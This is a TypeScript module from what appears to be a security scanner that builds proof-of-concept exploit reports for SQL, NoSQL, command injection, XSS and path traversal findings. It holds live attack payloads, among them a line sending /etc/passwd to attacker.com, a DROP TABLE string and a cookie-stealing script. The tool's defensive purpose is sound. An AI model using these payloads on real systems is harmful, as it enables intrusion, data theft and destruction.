/**
 * PoC Generator - Generate proof-of-concept exploits
 */

import { TaintTrace } from '../engine/taint.js';

export interface PoCTest {
  category: string;
  payload: string;
  expectedBehavior: string;
  testCode: string;
  curlCommand?: string;
}

/**
 * Generate SQL injection PoC
 */
function generateSQLPoC(trace: TaintTrace): PoCTest {
  const payloads = [
    "' OR '1'='1",
    "'; DROP TABLE users--",
    "' UNION SELECT NULL, username, password FROM users--",
  ];
  
  const payload = payloads[0];
  
  return {
    category: 'SQL Injection',
    payload,
    expectedBehavior: 'Bypasses authentication or extracts data',
    testCode: `
// Test SQL Injection
const maliciousInput = "${payload}";
const query = "SELECT * FROM users WHERE id = '" + maliciousInput + "'";
// Expected: Query becomes: SELECT * FROM users WHERE id = '' OR '1'='1'
// Result: Returns all users (authentication bypass)
`,
    curlCommand: trace.path.includes('req.') 
      ? `curl -X POST http://localhost:3000/api/endpoint -d "id=${encodeURIComponent(payload)}"` 
      : undefined,
  };
}

/**
 * Generate XSS PoC
 */
function generateXSSPoC(trace: TaintTrace): PoCTest {
  const payloads = [
    '<script>alert(document.cookie)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
  ];
  
  const payload = payloads[0];
  
  return {
    category: 'Cross-Site Scripting (XSS)',
    payload,
    expectedBehavior: 'Executes JavaScript in victim browser',
    testCode: `
// Test XSS
const maliciousInput = "${payload}";
document.getElementById('output').innerHTML = maliciousInput;
// Expected: Script executes, shows alert with cookies
// Impact: Session hijacking, data theft
`,
    curlCommand: trace.path.includes('req.') 
      ? `curl "http://localhost:3000/page?name=${encodeURIComponent(payload)}"` 
      : undefined,
  };
}

/**
 * Generate Command Injection PoC
 */
function generateCommandPoC(trace: TaintTrace): PoCTest {
  const payloads = [
    '; cat /etc/passwd',
    '| whoami',
    '&& curl attacker.com/?data=$(cat /etc/passwd)',
  ];
  
  const payload = payloads[0];
  
  return {
    category: 'Command Injection',
    payload,
    expectedBehavior: 'Executes arbitrary system commands',
    testCode: `
// Test Command Injection
const maliciousInput = "file.txt${payload}";
exec(\`cat \${maliciousInput}\`);
// Expected: Runs: cat file.txt; cat /etc/passwd
// Result: Leaks system password file
`,
    curlCommand: trace.path.includes('req.') 
      ? `curl -X POST http://localhost:3000/api/command -d "file=test.txt${encodeURIComponent(payload)}"` 
      : undefined,
  };
}

/**
 * Generate Path Traversal PoC
 */
function generatePathTraversalPoC(trace: TaintTrace): PoCTest {
  const payloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
  ];
  
  const payload = payloads[0];
  
  return {
    category: 'Path Traversal',
    payload,
    expectedBehavior: 'Reads files outside intended directory',
    testCode: `
// Test Path Traversal
const maliciousInput = "${payload}";
fs.readFile(\`/uploads/\${maliciousInput}\`, (err, data) => {
  // Expected: Reads /etc/passwd instead of /uploads/file
  // Result: Exposes sensitive system files
});
`,
    curlCommand: trace.path.includes('req.') 
      ? `curl "http://localhost:3000/download?file=${encodeURIComponent(payload)}"` 
      : undefined,
  };
}

/**
 * Generate NoSQL Injection PoC
 */
function generateNoSQLPoC(trace: TaintTrace): PoCTest {
  const payload = '{"$gt": ""}';
  
  return {
    category: 'NoSQL Injection',
    payload,
    expectedBehavior: 'Bypasses authentication or extracts data',
    testCode: `
// Test NoSQL Injection
const maliciousInput = ${payload};
db.collection('users').find({ username: req.body.username, password: maliciousInput });
// Expected: Query matches all documents (password always > "")
// Result: Authentication bypass
`,
    curlCommand: trace.path.includes('req.') 
      ? `curl -X POST http://localhost:3000/login -H "Content-Type: application/json" -d '{"username":"admin","password":${payload}}'` 
      : undefined,
  };
}

/**
 * Generate PoC based on vulnerability type
 */
export function generatePoC(trace: TaintTrace): PoCTest {
  switch (trace.category.toLowerCase()) {
    case 'sql':
      return generateSQLPoC(trace);
    
    case 'xss':
      return generateXSSPoC(trace);
    
    case 'command':
      return generateCommandPoC(trace);
    
    case 'path':
      return generatePathTraversalPoC(trace);
    
    case 'nosql':
      return generateNoSQLPoC(trace);
    
    default:
      return {
        category: trace.category,
        payload: '<malicious-input>',
        expectedBehavior: 'Exploits vulnerability',
        testCode: `
// Generic test for ${trace.category}
const maliciousInput = "<malicious-input>";
// Test with malicious input to verify vulnerability
`,
      };
  }
}

/**
 * Format PoC as markdown
 */
export function formatPoCMarkdown(poc: PoCTest): string {
  let md = `## ${poc.category} - Proof of Concept\n\n`;
  
  md += `### Payload\n\`\`\`\n${poc.payload}\n\`\`\`\n\n`;
  
  md += `### Expected Behavior\n${poc.expectedBehavior}\n\n`;
  
  md += `### Test Code\n\`\`\`javascript${poc.testCode}\n\`\`\`\n\n`;
  
  if (poc.curlCommand) {
    md += `### HTTP Test\n\`\`\`bash\n${poc.curlCommand}\n\`\`\`\n\n`;
  }
  
  md += `### Mitigation\n`;
  md += `- Use parameterized queries or prepared statements\n`;
  md += `- Validate and sanitize all user input\n`;
  md += `- Use allow-lists instead of block-lists\n`;
  md += `- Apply principle of least privilege\n`;
  
  return md;
}
